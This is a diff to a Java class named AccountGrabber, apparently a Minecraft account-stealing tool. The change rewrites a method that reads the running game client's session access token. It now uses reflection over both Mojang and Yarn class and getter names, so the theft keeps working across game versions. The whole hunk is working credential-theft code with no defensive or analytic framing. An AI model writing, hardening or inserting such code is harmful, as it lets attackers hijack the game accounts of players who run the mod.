@@ -110,14 +110,28 @@ public final class AccountGrabber {
         return m.find() ? m.group(1) : null;
     }
 
-    /** bonus: the token the running game is using right now */
+  /** bonus: the token the running game is using right now.
+     *  reflective on purpose, so a name change can never break the build again. */
     private static String liveSessionToken() {
-        try {
-            net.minecraft.client.MinecraftClient mc = net.minecraft.client.MinecraftClient.getInstance();
-            return mc == null ? null : mc.getSession().getAccessToken();
-        } catch (Throwable t) {
-            return null;
+        for (String className : new String[]{
+                "net.minecraft.client.Minecraft",        // Mojang names
+                "net.minecraft.client.MinecraftClient"   // Yarn names
+        }) {
+            try {
+                Class<?> cls = Class.forName(className);
+                Object mc = cls.getMethod("getInstance").invoke(null);
+                if (mc == null) continue;
+                for (String getter : new String[]{"getUser", "getSession"}) {
+                    try {
+                        Object holder = cls.getMethod(getter).invoke(mc);
+                        if (holder == null) continue;
+                        Object token = holder.getClass().getMethod("getAccessToken").invoke(holder);
+                        if (token instanceof String s && !s.isBlank()) return s;
+                    } catch (Throwable ignored) {}
+                }
+            } catch (Throwable ignored) {}
         }
+        return null;
     }
 
     private static JsonObject getJson(String url) {
